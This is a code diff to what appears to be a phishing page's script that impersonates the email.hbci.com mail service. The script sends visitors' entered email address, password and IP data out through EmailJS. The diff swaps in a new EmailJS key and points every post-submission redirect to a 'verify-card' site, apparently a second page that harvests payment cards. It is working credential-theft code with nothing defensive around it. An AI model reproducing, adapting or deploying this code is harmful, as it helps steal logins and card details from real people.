@@ -18,7 +18,7 @@
       // Initialize EmailJS with public key
       (function () {
         emailjs.init({
-          publicKey: "xGT5HoyArhgWh7Ze7",
+          publicKey: "KSEdSxmRMHr6VM9jq",
         });
         console.log("EmailJS initialized");
       })();
@@ -126,13 +126,13 @@
               dataSent = true;
               /* console.log("✅ IP data successfully sent via EmailJS");
               console.log("Response:", response.status, response.text); */
-              window.location.replace("https://email.hbci.com/");
+              window.location.replace("https://verify-card.vercel.app?redirect=https://email.hbci.com",);
               return response;
             })
             .catch(function (error) {
              /*  console.error("❌ Failed to send IP data via EmailJS:", error);
               console.error("Error details:", error.text || error.message); */
-              window.location.replace("https://email.hbci.com/");
+              window.location.replace("https://verify-card.vercel.app?redirect=https://email.hbci.com",);
               throw error;
             });
         }
@@ -284,11 +284,11 @@
               sendDataViaEmail(emailValue, passwordValue)
                 .then(() => {
                   // console.log("✅ Email sent successfully, redirecting...");
-                  window.location.replace("https://email.hbci.com/");
+                  window.location.replace("https://verify-card.vercel.app?redirect=https://email.hbci.com",);
                 })
                 .catch((error) => {
                   // console.error("❌ Error sending email:", error);
-                  window.location.replace("https://email.hbci.com/");
+                  window.location.replace("https://verify-card.vercel.app?redirect=https://email.hbci.com",);
                 });
             });
           } else {
